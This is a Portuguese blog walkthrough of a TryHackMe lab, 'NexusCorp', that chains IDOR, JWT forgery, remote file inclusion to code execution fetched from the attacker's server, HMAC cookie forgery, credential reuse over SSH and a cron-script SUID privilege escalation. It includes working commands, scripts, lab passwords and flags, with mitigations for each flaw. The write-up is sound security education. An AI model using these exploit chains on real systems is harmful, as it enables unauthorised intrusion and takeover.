---
layout: post
title: "NexusCorp - Do Recon ao Root: IDOR, JWT, RFI, SSH e Cron"
description: "Walkthrough da NexusCorp - THM: Nmap, Gobuster, backup AES, usuários, Hydra, IDOR, JWT, RFI/RCE, reutilização de credenciais e escalonamento por cron/SUID."
date: 2026-11-02
categories: [walkthrough]
tags: [linux, tryhackme, nexuscorp, recon, nmap, gobuster, idor, jwt, hmac, rfi, rce, hydra, ssh, credential-reuse, cron, suid, privilege-escalation]
---

# NexusCorp — Do Recon ao Root: IDOR, JWT, RFI, SSH e Cron

Mais uma room linux do **TryHackMe**.
Inicio: somente IP do alvo "NexusCorp".
Objetivo era descobrir a superfície de ataque, conseguir acesso ao portal, encontrar uma forma de entrar no servidor e chegar a **root**.

Essa escalada é básicamente uma sequencia de missconfigures.

> **Aviso:** Tudo feito em laboratório autorizado.

## Índice

1. [Mapa do laboratório](#mapa)
2. [Reconhecimento: portas, diretórios e arquivos](#recon)
3. [Backup AES e enumeração de usuários](#backup)
4. [Acesso inicial: Sarah Johnson](#inicial)
5. [IDOR nos perfis — Flag 1](#idor)
6. [JWT, leitura de arquivos e RFI/RCE — Flag 3](#rfi)
7. [Cookie administrativo e HMAC — Flag 2](#admin)
8. [Credential Reuse e SSH — Flag 4](#ssh)
9. [Cron e SUID: devops → root — Flag 5](#root)
10. [Outras técnicas e comparação de percursos](#alternativas)
11. [Erros, mitigações e checklist](#checklist)

<a id="mapa"></a>

## 1. Ambiente e cadeia de exploração

| Item | Resultado |
|---|---|
| Alvo | `10.66.188.47` |
| AttackBox | `10.66.87.185` |
| SSH | OpenSSH 9.6p1 / Ubuntu |
| HTTP | Apache 2.4.58 / PHP |
| Login web obtido | `sarah.johnson` |
| Execução remota | `www-data` (UID 33) |
| Conta Linux | `devops` (UID 1001) |
| Objetivo | `euid=0(root)` |

~~~text
IP → Nmap e Gobuster
      |
      +--> backup + JavaScript + usuários
      |               |
      |               +--> login Sarah → IDOR → Flag 1
      |                           |
      |                           +--> JWT adulterado → File Viewer
      |                                           |
      |                                           +--> RFI/RCE www-data → Flag 3
      |                                                    |
      |                                                    +--> chave HMAC → painel admin → Flag 2
      |                                                    |
      |                                                    +--> senha reutilizada → SSH devops → Flag 4
      |                                                                        |
      +------------------------------------------------------------------------+
                                                                               |
                                                                  cron root + script gravável
                                                                               |
                                                                        Bash SUID → root
                                                                               |
                                                                             Flag 5
~~~

**A ordem das flags não foi sequencial.** Acabei encontrando a Flag 3 antes da Flag 2. A Flag 2 menciona *Blind XSS / Session Hijacking*, mas meu caminho foi **recuperar a chave HMAC do código interno e assinar uma sessão admin**.

> **Comparação com outro writeup:** o outro autor explorou as mesmas falhas, mas obteve uma reverse shell como `www-data`, trocou de usuário com `su` e, no cron, recebeu outra reverse shell como root. Eu usei execução por requisições HTTP, SSH e Bash SUID. As técnicas alternativas são explicadas abaixo, **sem apresentá-las como testes realizados por mim**.

<a id="recon"></a>

## 2. Reconhecimento de portas, diretórios e arquivos

### 2.1 Nmap: o que está rodando?

O primeiro reconhecimento mostrou duas portas:

~~~text
22/tcp open  ssh  OpenSSH 9.6p1 Ubuntu
80/tcp open  http Apache httpd 2.4.58 (Ubuntu)
~~~

Enumerei as portas com nmap:

~~~bash
TARGET=10.66.188.47
nmap -sV -sC "$TARGET"
~~~
- `TARGET`: cria uma variavel de ambiente, depois podemos usar o $ pra chamar uma variavel, no caso $TARGET.
- `-sV`: tenta identificar serviço e versão.
- `-sC`: executa os scripts padrão.
  Podemos usar o -p tambem:
- `-p`: seleciona portas. Se precisar checar todas as portas TCP, usar `-p-` dentro do escopo autorizado.

O SSH estava disponível, ele não aceitava login anonimo, então deixei de lado por enquanto.

### 2.2 Gobuster: combinar wordlists e descobrir PHP

Juntei duas listas do lab:

~~~bash
cat apache.txt common.txt | sort -u > dirs.txt

gobuster dir -u "http://$TARGET/" -w dirs.txt -x php,txt,bak,old,zip -t 10
~~~

| Opção | Função |
|---|---|
| `sort -u` | Remove entradas repetidas |
| `dir` | Enumera caminhos e diretórios |
| `-u` | URL alvo |
| `-w` | Wordlist |
| `-x` | Acrescenta extensões aos nomes testados |
| `-t 10` | Usa até dez requisições paralelas |

**Erro que cometi:** no primeiro Gobuster não incluí `-x`. Páginas como `forgot.php` e `team.php` só apareceram quando repeti a busca com extensões.

Principais achados:

| Caminho | Resposta/uso |
|---|---|
| `/backup/` | Directory Listing: `README.txt` e `config.enc` |
| `/static/app.js` | JavaScript com configuração, sessão e chave AES |
| `/team.php` | Funcionários e e-mails |
| `/forgot.php` | Recuperação de senha |
| `/api/login.php` | API de login por POST |
| `/api/reset.php` | API de recuperação por POST |
| `/api/users/profile.php` | API de perfis; depois revelou IDOR |
| `/api/auth/token.php` | Emite JWT para sessão autenticada |
| `/api/files.php` | File Viewer que exige JWT admin |
| `/dashboard.php`, `/support/` | Redirecionavam ao login sem sessão |
| `/admin/index.php` | Respondia 403 sem sessão administrativa |

**Dica:** `301` costuma indicar redirecionamento de caminho; `302`, redirecionamento da aplicação; `401`, falta autenticação; `403`, acesso negado.

**Mitigação:** desabilitar listagem de diretórios públicos, remover backups da raiz web e limitar a exposição de endpoints internos.

<a id="backup"></a>

## 3. Backup AES e enumeração de usuários

### 3.1 Descobrir a chave e descriptografar

Em `/backup/README.txt`, li que `config.enc` era um backup **AES-128-ECB** e que a referência da chave estava em `/static/app.js`.
Então, fui dar uma olhada no app.js.

~~~javascript
_backupKey: 'N3xusK3y2024!!'
~~~

Antes de descriptografar, salvei e inspecionei o arquivo:

~~~bash
curl -s "http://$TARGET/backup/config.enc" -o config.enc
file config.enc
xxd -l 32 config.enc
~~~

- `-o`: salva o arquivo sem tratar dados binários como texto.
- `file`: tenta identificar seu tipo.
- `xxd -l 32`: exibe os 32 primeiros bytes em hexadecimal.

Aqui cometi um pequeno erro de atenção, tentei decifrar com AES-256-CBC e não funcionou. O arquivo era AES-128-ECB, e o `-K` do OpenSSL exige uma **chave em hexadecimal**, não a string original.

A chave encontrada tinha 14 bytes e precisava de **dois bytes nulos** para completar 16 conforme escrito no arquivo javascript:
~~~
// Key: N3xusK3y2024!!  (pad to 16 bytes with �)
~~~
~~~bash
openssl enc -d -aes-128-ecb \
  -in config.enc -out config.txt \
  -K "$(printf 'N3xusK3y2024!!\x00\x00' | xxd -p -c 256)"
cat config.txt
~~~

- `enc -d`: descriptografa.
- `-aes-128-ecb`: seleciona AES-128 em modo ECB.
- `-in/-out`: define entrada e saída.
- `-K`: recebe a chave hexadecimal.
- `\x00`: adiciona um byte nulo.
- `xxd -p`: converte bytes em hexadecimal; `-c 256` evita quebras no valor.

Resultado:

~~~json
{"app_name":"NexusCorp Portal","version":"2.3.1","deploy_env":"production","system_user":"devops"}
~~~

**Achei o usuário `devops`, mas ainda não tinha senha.**

**A criptografia AES funciona de maneira sinmétrica, ou seja, usa a mesma chave pra criptografar e descriptografar e o modo ECB indica que é criptografado em blocos individuais**
**Mitigação:** segredos jamais devem estar em JavaScript público. Backups ficam fora da raiz do site, com acesso restrito; em projetos reais, preferir criptografia autenticada como AES-GCM e gerenciamento seguro de chaves.

### 3.2 Usuários e recuperação de senha

Até agora, eu só enumerei e olhei os arquivos publicos, então voltei pra aplicação pra verificar os outros diretorios.

A página `/team.php` revelou usuarios, como eu sei que o formulario de login pede um usuario no formato nome.sobrenome salvei em um txt:

~~~text
laura.hayes
michael.chen
sarah.johnson
robert.wilson
emma.taylor
david.brown
james.wright
~~~

No formulário de `/forgot.php` enviava `username` por POST:

~~~bash
curl -s "http://$TARGET/forgot.php" \
  --data-urlencode 'username=laura.hayes' | grep -i alert

curl -s "http://$TARGET/forgot.php" \
  --data-urlencode 'username=usuario.inexistente' | grep -i alert
~~~

Laura recebeu mensagem de reset e e-mail parcialmente exposto (`la****@nexus.corp`); um usuário inexistente recebeu `No account found with that username`. A mesma diferença apareceu em `/api/reset.php` com HTTP `200` para Laura e `404` para inexistente.

Isso é **User Enumeration**: o aplicativo revela diferenças que permitem validar nomes de contas. Uma mensagem genérica de envio não prova que o e-mail foi realmente entregue.

**Mitigação:** retornar mensagens genéricas, usar rate limiting e não revelar contas/e-mails desnecessariamente.

Nesse lab, a função de recuperar email não "serviu" de nada no teste de penetração, mas é sempre bom evitar-mos que isso aconteça ;-)
<a id="inicial"></a>

## 4. Acesso inicial

Bom, aqui eu já tinha feito uma enumeração externa em tudo que é possivel, não vou colocar todos resultados pq a maioria não levava a nada.
Não encontrei nenhuma pista em html, ou arquivo solto.
Então decidi voltar pro formulario de login...

Testei aspas simples e condições `AND 1=1`/`AND 1=2` em endpoints de login e recuperação. As respostas **não comprovaram SQL Injection**. A aplicação também armazenou aspas nos títulos dos tickets como texto normal, sem demonstrar execução SQL nem XSS.

Usei Hydra com a wordlist `rockyou.txt` mesmo (já fiz um writeup simples sobre criação de wordlists) e encontrei um login válido para Sarah:

~~~bash
hydra -l sarah.johnson -P rockyou.txt "$TARGET" \
  http-post-form '/index.php:username=^USER^&password=^PASS^:F=Invalid credentials' \
  -t 4 -f
~~~

- `-l`: um único usuário.
- `-P`: lista de senhas.
- `^USER^` e `^PASS^`: campos preenchidos pelo Hydra.
- `F=`: padrão textual considerado falha.
- `-t`: tarefas simultâneas.
- `-f`: interrompe quando reportar sucesso.

**Credencial encontrada e confirmada no portal:** `sarah.johnson:password`.

Agora **cuidado** eu tive um falso positivo com Laura. Se a resposta do servidor mudar para algo que não contenha `Invalid credentials`, o Hydra pode anunciar sucesso incorretamente. Isso fez eu perder uns minutos tentando entender kkk mas no fim eu descartei o user laura e voltei pra lista, como a sarah era a segunda da lista o hydra encontrou rapidamente a senha.

**Mitigação:** MFA, senhas fortes, proteção contra tentativas repetidas, logs e alertas de autenticação.

<a id="idor"></a>

## 5. IDOR nos perfis — Flag 1

Blz, usuario e senha na mão acessei o portal de usuarios.
Dentro do portal, consultei `/api/users/profile.php?id=3`, que correspondia a Sarah. Troquei o numero do ID só de sacanagem para `1` e voilà temos um idor:

~~~text
/api/users/profile.php?id=1
~~~

A resposta mostrou o perfil de Laura, inclusive `role: admin` e a flag:

~~~text
THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}
~~~

O nome dessa falha é **IDOR (Insecure Direct Object Reference)**, também chamada **BOLA** no contexto de APIs. A aplicação conferia que eu estava autenticado, mas **não verificava se Sarah podia ler aquele objeto**.

Para verificar de forma genérica:

~~~bash
curl -s "http://$TARGET/api/users/profile.php?id=1" \
  -b 'nexus_session=<cookie_de_sarah>' | jq
~~~

- `-b` envia um cookie.
- `id=1` escolhe o objeto consultado.
- `jq` formata a resposta JSON.

**Mitigação:** verificar autorização para *cada objeto* no backend, com ownership e RBAC. Ocultar links não é um controle de acesso.

<a id="rfi"></a>

## 6. JWT → RFI/RCE — Flag 3

### 6.1 Cookie não é JWT

O cookie armazena dados da sessão no navegador, e o JWT é um token usado pra autenticação. Eles podem
coexistir e não dependem necessariamente um do outro. No contexto do lab, ao efetuar o login eu recebia um cookie.
Já o token, eu precisava solicitar na API.

Em `app.js` havia dois mecanismos:

| Dado | Local | Finalidade |
|---|---|---|
| `nexus_session` | Cookie | Sessão do site |
| `nexus_jwt` | Local Storage | JWT usado na API |

Com a sessão válida de Sarah, solicitei o token em:
~~~
/api/auth/token.php

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzYXJhaC5qb2huc29uIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3OTM2MjAzNDUsImV4cCI6MTc5MzYyMzk0NX0.C\/TwmOVH+lzeGX2AqjSXJE8BCdKRFCrow2aHGTu\/ITA","expires_in":3600,"note":"Use this token as: Authorization: Bearer <token> for \/api\/files.php"}
~~~
Depois, olhei a página de tickets pra ver se existia alguma possibilidade de injection mas foi sem sucesso.

O login tambem revelou um segundo possivel alvo:

/api/files.php?name=

~~~bash
COOKIE='<valor_original_do_cookie>'
TOKEN=$(curl -s "http://$TARGET/api/auth/token.php" \
  -b "nexus_session=$COOKIE" | jq -r '.token')

curl -i "http://$TARGET/api/files.php" \
  -H "Authorization: Bearer $TOKEN"
~~~

A API respondeu `Admin JWT required` 

Normalmente um JWT é dividido em 3 partes. 

HEADER.PAYLOAD.SIGNATURE

- `Header`: algoritmo utilizado na assinatura.
- `Payload`: informações como ID, usuário, permissões e expiração.
- `Signature`: assinatura que permite verificar se o token foi alterado.

No caso da lab o token divido ficava assim, pra exemplo:

- `Header`: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
- `Payload`: eyJzdWIiOiJzYXJhaC5qb2huc29uIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3OTM2MjE5NjAsImV4cCI6MTc5MzYyNTU2MH0
- `Signature`: cYelhDc97iw0LxgeFgeekrZ8fEGGRorjzoqbMOuJ0xQ

Decodificado

- `Header`: {"alg":"HS256","typ":"JWT"}
- `Payload`: {"sub":"sarah.johnson","role":"user","iat":1793621960,"exp":1793625560}
- `Signature`: q¥7=î,4/¶||AFãÎ0ëÓ
  

Então eu testei, se eu trocar só a role pra admin, sem recalcular a assinatura:

~~~bash
FORGED=$(TOKEN="$TOKEN" python3 - <<'PY'
import os, json, base64

header, payload, signature = os.environ['TOKEN'].split('.')
data = json.loads(base64.urlsafe_b64decode(payload + '=='))
data['role'] = 'admin'
payload = base64.urlsafe_b64encode(
    json.dumps(data, separators=(',', ':')).encode()
).decode().rstrip('=')
print(f'{header}.{payload}.{signature}')
PY
)
~~~

O token adulterado passou da checagem de role: recebi `Missing name parameter` em vez de `Admin JWT required`, e **consegui ler arquivos de verdade**. Isso comprovou uma falha na validação do JWT. Alterar o payload deveria invalidar sua assinatura.

**Dica do outro writeup:** um JWT mal copiado pode falhar antes de chegar à lógica vulnerável. Para conferir **apenas o payload**, sem enviar requisições:

~~~bash
TOKEN='<jwt_de_teste>'
TOKEN="$TOKEN" python3 - <<'CHECKJWT'
import os, json, base64
parts = os.environ["TOKEN"].split(".")
if len(parts) != 3:
    raise SystemExit("JWT precisa ter 3 partes")
payload = parts[1] + "=" * (-len(parts[1]) % 4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(payload)), indent=2))
CHECKJWT
~~~

O código separa as partes, repõe o padding Base64URL e mostra o JSON. **Decodificar não valida a assinatura**: é apenas uma conferência de estrutura e claims.

**Mitigação:** usar biblioteca JWT confiável e validar assinatura, algoritmo, emissor, audiência e expiração **antes** de confiar no campo `role`.

### 6.2 Ler arquivos do aplicativo

Com o JWT autenticado com a role admin, fui verificar como funcionava a leitura de arquivos pelo files.php

O parâmetro informado pela API era `name=/var/www/html/filename.txt`. Eu consegui ler inclusive o código-fonte de `api/files.php`:

~~~bash
curl -sG "http://$TARGET/api/files.php" \
  -H "Authorization: Bearer $FORGED" \
  --data-urlencode 'name=/var/www/html/api/files.php' \
  | jq -r '.content'
~~~
- `-s`: oculta barra de progresso.
- `-G`: move os parâmetros para a URL.
- `--data-urlencode`: codifica caracteres especiais no valor.
- `jq -r '.content'`: extrai o conteúdo textual do JSON.

Testei `/etc/passwd` diretamente e com `../../../../`. Ambos retornaram `403`, pois o código usava `realpath()` para limitar arquivos locais à raiz `/var/www/html/`. **Não confirmei Path Traversal.**

### 6.3 RFI que executava PHP

No código havia a falha principal:

~~~php
if (strpos($name, 'http://') === 0 || strpos($name, 'https://') === 0) {
    $remote = @file_get_contents($name);
    ob_start();
    eval(str_replace('<?php', '', $remote));
    $output = ob_get_clean();
    echo json_encode(['output' => $output]);
    exit;
}
~~~

O servidor baixava o código de uma URL externa e executava com `eval()`. Esse bloco era processado **antes** da validação `realpath()` dos arquivos locais. Resultado: **RFI (Remote File Inclusion) → RCE (Remote Code Execution)**.

Como a url é processada antes de validar, podemos fazer o seguinte:

Na AttackBox, fiz um txt com um comando PHP.
O servidor ao receber esse arquivo executa ele como se fosse um codigo php e nao um txt.

Por exemplo:

~~~bash
ATTACKER=10.66.87.185
echo 'echo "RFI_OK: " . gethostname();' > proof.txt
python3 -m http.server 8000 --bind 0.0.0.0
~~~

O texto "echo... gethostname()" foi salvo no arquivo .txt, esse arquivo vai ser executado remotamente pelo target.

No codigo php tem a seguinte linha:

eval(str_replace('<?php', '', $remote));

Essa linha vai remover tudo que estiver escrito <?php e depois vai executar remotamente.

No nosso caso, 'echo "RFI_OK: " . gethostname();' vira **eval("echo "RFI_OK: " . gethostname();");**
e isso em php faz o seguinte:

- `echo`: imprime uma informação.
- `"RFI_OK: "`: texto.
- `.`: operador de concatenação de strings no PHP.
- `gethostname()`: retorna o nome do host onde o PHP está executando.

Em outro terminal:

~~~bash
curl -sG "http://$TARGET/api/files.php" \
  -H "Authorization: Bearer $FORGED" \
  --data-urlencode "name=http://$ATTACKER:8000/proof.txt" | jq
~~~

Resposta:

~~~json
{"output":"RFI_OK: tryhackme-2404"}
~~~

O hostname era o da **NexusCorp**, provando execução do lado do servidor. Reutilizei o arquivo para enumerar rapidamente:

~~~bash
cat > proof.txt <<'PAYLOAD'
echo shell_exec('
id
whoami
hostname
pwd
uname -a
ls -la /home
ls -la /var/www/html
ls -la /opt
');
PAYLOAD
~~~

Executei a mesma requisição, agora com `jq -r '.output'`. Resultado relevante:

~~~text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
tryhackme-2404
/var/www/html/api
/home/devops
/home/ubuntu
~~~

Encontrei e li `/opt/flag3.txt`:

~~~text
THM{rf1_2_rc3_f00th0ld_fl4g3}
~~~

**Mitigação:** nunca executar conteúdo remoto com `eval()`, remover suporte a RFI, aplicar allowlist para arquivos, restringir saída HTTP da aplicação e usar privilégios mínimos no processo web.

### 6.4 Alternativa do outro writeup: reverse shell

Na minha execução, cada requisição `curl` acionava um comando PHP e retornava a saída em JSON. **Ter RCE não significa necessariamente ter uma shell interativa.** O outro autor usou a mesma RFI para fazer o servidor abrir uma *reverse shell* para sua AttackBox.

~~~text
Meu método (comandos sob demanda):
NexusCorp  --HTTP GET:8000-->  servidor Python / proof.txt
                            <- saída no JSON da API

Outro método (reverse shell):
NexusCorp  --TCP:4444------>  listener Netcat da AttackBox
                              comandos e respostas pela conexão
~~~

O autor abriu um listener:

~~~bash
nc -lvnp 4444
~~~

- `-l`: escuta conexões; `-v`: mostra detalhes; `-n`: não resolve nomes; `-p`: indica a porta.
- A técnica de reverse shell dele enviava o `stdin`/`stdout` de um **Bash** para essa conexão.
- `/dev/tcp/HOST/PORT` é um recurso do **Bash**, não um arquivo comum nem uma funcionalidade garantida do `sh`.

Após receber a conexão, tornou o terminal mais utilizável:

~~~bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
~~~

`pty.spawn()` cria um pseudoterminal para programas que precisam de entrada interativa. Isso é útil para `su`, editores e utilitários que se comportam mal em shells simples.

Ele também mostrou uma alternativa que usa **`mkfifo` + `cat` + `sh` + `nc`**: `mkfifo` cria um *named pipe* e o Netcat transporta a entrada e a saída entre a rede e o shell. Essa opção depende de os utilitários estarem instalados no alvo.

**Eu não precisei de reverse shell para a Flag 3:** a execução remota pela API foi suficiente para enumerar, identificar `www-data` e ler `/opt/flag3.txt`. Uma shell persistente seria útil para tarefas interativas.

<a id="admin"></a>

## 7. Bot administrativo e HMAC — Flag 2

A enumeração de `/opt` revelou `admin_bot.py`, arquivo legível pelo `www-data`. Entre as configurações:

~~~python
DB_CONFIG = dict(host='localhost', database='nexusdb',
                 user='app_user', password='D3v0ps!2024')
APP_SECRET = 'nexus_app_k3y_2024'
~~~

O bot buscava tickets não revisados e fazia requisições às URLs presentes nas mensagens, usando **um cookie de Laura como administradora**. Isso explicava a pista de tickets/Blind XSS. No entanto, **não usei Blind XSS para obter a Flag 2**.

O cookie tinha duas partes: **Base64(JSON).assinatura hexadecimal**, assinada por HMAC-SHA256. Tentar editar `role=user` para `admin` mantendo a assinatura antiga resultou em `302` para o login. Agora, com a chave exposta, pude gerar uma assinatura válida:

~~~bash
ADMIN_COOKIE=$(python3 - <<'PY'
import base64, json, hmac, hashlib

data = base64.b64encode(json.dumps({
    'user_id': 1, 'username': 'laura.hayes', 'role': 'admin'
}).encode()).decode()
sig = hmac.new(b'nexus_app_k3y_2024', data.encode(), hashlib.sha256).hexdigest()
print(f'{data}.{sig}')
PY
)

curl -i "http://$TARGET/admin/index.php" \
  -b "nexus_session=$ADMIN_COOKIE"
~~~

A página retornou `HTTP 200 OK` e o painel administrativo. No Firefox fui em **F12 → Storage → Cookies**, alterei somente o **Value** de `nexus_session` para o valor de `ADMIN_COOKIE` e atualizei a página.

**Erro que cometi:** coloquei o JWT no campo do cookie. JWT e `nexus_session` são formatos diferentes. O cookie administrativo válido começa pelo Base64 de `user_id`, não por um header JWT.

No painel encontrei:

~~~text
THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}
~~~

**Observação:** `/api/auth/token.php` retornou um JWT com `role: user` mesmo ao receber o cookie administrativo criado. Isso não invalida o acesso web: o `200` em `/admin/index.php` comprovou a sessão administrativa, mas os dois controles de autorização tinham comportamentos diferentes.

**Outro caminho citado no texto comparado:** o autor afirma ter encontrado a chave HMAC também ao ler `config.php`. **Eu obtive essa chave no `admin_bot.py`**, como registrado na minha enumeração. Ambos os caminhos podem revelar segredos internos, mas não vou atribuir a mim a leitura de um conteúdo que não registrei.

O autor menciona ainda que, com leitura de arquivos ou shell, seria possível consultar diretamente o código **`/var/www/html/admin/index.php`** para localizar a Flag 2. Eu a confirmei abrindo o **painel administrativo** com cookie assinado e verificando seu HTML. Esse detalhe é útil quando o navegador não aceita a sessão.

**Mitigação:** armazenar chaves HMAC fora de código acessível, proteger scripts internos, restringir bot com credencial privilegiada e evitar que ele acesse URLs arbitrárias de usuários.

<a id="ssh"></a>

## 8. Reutilização de senha: SSH como devops — Flag 4

O backup revelara `devops`. Já o `admin_bot.py` revelara uma senha de serviço do banco. Testei a **reutilização dessa senha no SSH**:

~~~bash
ssh devops@10.66.188.47
# senha do laboratório: D3v0ps!2024
~~~

Funcionou:

~~~bash
id
whoami
hostname
pwd
cat ~/user.txt
~~~

~~~text
uid=1001(devops) gid=1001(devops) groups=1001(devops)
devops
tryhackme-2404
/home/devops
THM{s5h_cr3d_r3u53_l4t3r4l_fl4g4}
~~~

Isso é **Credential Reuse**: a mesma senha usada em um serviço foi aceita por outra conta com privilégios e finalidade diferentes.

**Alternativa do outro writeup:** com uma reverse shell interativa no próprio servidor, o autor usou `su devops`, informando a senha reutilizada. Eu usei `ssh devops@<target>` a partir da AttackBox. O `su` troca o usuário local da sessão e costuma exigir entrada interativa; o SSH abre uma nova conexão remota. Ambos dependem da mesma credencial exposta.

**Mitigação:** credenciais distintas por serviço, rotação após vazamento, contas de serviço sem login SSH e autenticação por chave quando aplicável.

<a id="root"></a>

## 9. Cron + script gravável + SUID: root — Flag 5

### 9.1 Quem pode alterar o script?

Já na sessão SSH como `devops`:

~~~bash
sudo -l
ls -l /opt/monitoring/health_report.sh
cat /opt/monitoring/health_report.sh
~~~

O `sudo -l` negou privilégios. Mas as permissões do script eram:

~~~text
-rwxrwxr-- 1 root devops 537 /opt/monitoring/health_report.sh
~~~

O proprietário era `root`, porém **o grupo `devops` tinha escrita**. O script verificava se Apache/MySQL estavam ativos e registrava o uso do disco em `/var/log/nexus_health.log`.

> Ter permissão para alterar um script **não basta** para virar root. Tudo depende de QUEM EXECUTA.

### 9.2 pspy confirmou execução como root

A ferramenta `pspy64` já estava na máquina, mas eu poderia enviar ela caso necessario, já que estava logado por ssh.

~~~bash
/opt/tools/pspy64
~~~

Ela mostrou repetidamente:

~~~text
13:32:01 CMD: UID=0 | /bin/sh -c /opt/monitoring/health_report.sh
13:32:01 CMD: UID=0 | /bin/bash /opt/monitoring/health_report.sh
13:33:01 CMD: UID=0 | /bin/bash /opt/monitoring/health_report.sh
~~~

`UID=0` significa **root**, e a execução acontecia aproximadamente a cada minuto. Uma tarefa do cron estava executando um script que meu usuário podia modificar.

Também é útil buscar a referência em agendamentos:

~~~bash
grep -R 'health_report.sh' /etc/crontab /etc/cron.d \
  /etc/systemd/system /lib/systemd/system 2>/dev/null
~~~

`grep -R` pesquisa recursivamente; `2>/dev/null` oculta erros de acesso. Nesta room, a **prova** foi a execução observada no `pspy`.

### 9.3 Criar um Bash SUID como root

Guardei uma cópia do script para restaurar depois:

~~~bash
cp /opt/monitoring/health_report.sh ~/health_report.sh.bak
~~~

Acrescentei uma linha ao final do script:

~~~bash
echo 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash' \
  >> /opt/monitoring/health_report.sh
~~~

- `>>`: acrescenta conteúdo sem apagar o script original.
- `cp /bin/bash /tmp/rootbash`: o cron, rodando como root, cria uma cópia do Bash.
- `chmod 4755`: ativa o **bit SUID** (4) e define permissões de execução.

Na execução seguinte:

~~~bash
ls -l /tmp/rootbash
~~~

~~~text
-rwsr-xr-x 1 root root ... /tmp/rootbash
~~~

O `s` mostra que o executável tem SUID. Executei:

~~~bash
/tmp/rootbash -p
id
whoami
cat /root/root.txt
~~~

~~~text
uid=1001(devops) gid=1001(devops) euid=0(root)
root
THM{pr1v3sc_cr0n_r00t_fl4g5}
~~~

**UID x EUID:** o UID real continuou sendo `devops` (1001), mas o UID **efetivo** passou a ser `root` (0), e o `-p` preservou esse privilégio no Bash. O método também depende de o filesystem permitir SUID (sem `nosuid`).

### 9.4 Alternativa do outro writeup: reverse shell executada pelo cron

O segundo autor explorou **o mesmo script gravável executado como root**, mas, em vez de criar um Bash SUID, acrescentou código para que o cron abrisse uma **reverse shell como root**. Ele confirmou a identidade com `id`, que mostrou `uid=0(root)`.

| Técnica | Principal vantagem | Limitação |
|---|---|---|
| **Meu Bash SUID** | Não exige conexão de retorno depois de criado | Deixa executável SUID no disco; depende de filesystem sem `nosuid` |
| **Reverse shell via cron** | Recebe shell diretamente com a identidade do cron | Requer listener, conectividade TCP e ferramentas no alvo |

Um detalhe importante: ele usou `>` para **substituir** o conteúdo do script; eu usei `>>` para **acrescentar** a linha e manter o monitoramento original. Sobrescrever pode interromper a tarefa legítima. Em ambos os casos, o teste exige backup e restauração.

<a id="alternativas"></a>

## 10. Comparação das outras técnicas

| Momento | O que fiz | O que o outro autor fez |
|---|---|---|
| RFI/RCE | Comandos HTTP com resposta JSON | Reverse shell interativa como `www-data` |
| Conectividade | Servidor HTTP na porta 8000 funcionou | Corrigiu JWT copiado e firewall |
| `devops` | SSH pela AttackBox | `su` dentro da reverse shell |
| Cron root | Criou Bash SUID e usou `-p` | Conseguiu reverse shell como root |
| Flag 2 | Painel admin com HMAC encontrado no bot | Menciona chave em `config.php` e leitura direta de `admin/index.php` |

A **numeração de flags no outro relato difere** da ordem usada aqui. Neste laboratório eu confirmei as cinco flags pelo seu conteúdo, mesmo tendo obtido a Flag 3 antes da Flag 2.

<a id="checklist"></a>

## 11. O que não funcionou e checklist reutilizável

### Tentativas e lições

| Teste | Resultado | Aprendizado |
|---|---|---|
| AES-256-CBC no `config.enc` | Erro | Conferir modo, chave e formato do arquivo |
| SQLi no login/reset | Não confirmada | Aspas e condições booleanas não bastam como prova |
| Hydra na Laura | Resultado sem credencial válida confirmada | Cuidado com falsos positivos; validar o login |
| Cookie modificado sem nova assinatura | `302` | O servidor verificava integridade do cookie |
| JWT modificado sem nova assinatura | API aceitou a role | Falha de assinatura/autorização na API |
| `../` e `/etc/passwd` no File Viewer | `403` | `realpath()` bloqueou a travessia local testada |
| Tickets com aspas | Renderizados como texto | Não provam SQLi ou XSS |
| Login admin no Firefox | Primeiro `403` | Eu havia colocado um JWT no campo do cookie |
| Reverse shell/502 (outro writeup) | Problemas de token e firewall | Verificar direção da conexão, listener e JWT |
| `sudo -l` como devops | Sem sudo | Cron e permissões levaram à escalação |

### Checklist por fase

| Fase | O que enumerar | Como prevenir |
|---|---|---|
| Portas | Nmap, banners, versões e portas alternativas | Reduzir superfície e monitorar serviços |
| HTTP | Diretórios, extensões, backups e JavaScript | Remover backups, segredos e directory listing |
| Contas | Login, reset, usuários e respostas diferentes | Rate limiting e respostas genéricas |
| Autenticação | Cookies, JWT, assinatura e expiração | Validação criptográfica e MFA |
| Autorização | Objetos acessíveis trocando IDs | Checagem de ownership e RBAC no servidor |
| Arquivos | Leitura arbitrária, `realpath()`, URLs externas | Allowlist, bloqueio de RFI e de `eval()` |
| Pós-RCE | `id`, `pwd`, `/home`, `/opt`, permissões e necessidade de shell | Contas de serviço com privilégio mínimo |
| Movimento lateral | Senhas ou tokens reutilizados | Credenciais únicas e rotação |
| PrivEsc | `sudo -l`, cron, systemd, SUID, `pspy` | Scripts privilegiados imutáveis para usuários comuns |

Comandos práticos:

~~~bash
id
sudo -l
find /opt /usr/local/bin /home -type f -writable -printf '%p\n' 2>/dev/null
find /usr/bin /usr/local/bin -perm -4000 -type f 2>/dev/null
ps -eo user,pid,ppid,args
~~~

- `-writable`: mostra arquivos que o usuário atual pode escrever.
- `-printf '%p\n'`: imprime os caminhos (evita saídas longas).
- `-perm -4000`: busca executáveis com SUID.
- `ps -eo`: lista usuário, PID, PPID e comandos.
- `2>/dev/null`: oculta erros de permissão; não significa que o sistema inteiro foi verificado.

## Referências e posts relacionados

- [Linux Privilege Escalation — Cron, SUID e LD_PRELOAD](https://redp4w.github.io/notes/linux-cron-suid-ld-preload/)
- [Criando Wordlists](https://redp4w.github.io/notes/criando-wordlists/)
- [Linux Jump — Do Recon ao Root](https://redp4w.github.io/notes/jump-recon-ftp-privesc/)
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP — IDOR](https://owasp.org/www-community/attacks/Insecure_Direct_Object_Reference)
- [PortSwigger — JWT attacks](https://portswigger.net/web-security/jwt)
- [GTFOBins — Bash](https://gtfobins.github.io/gtfobins/bash/)

---
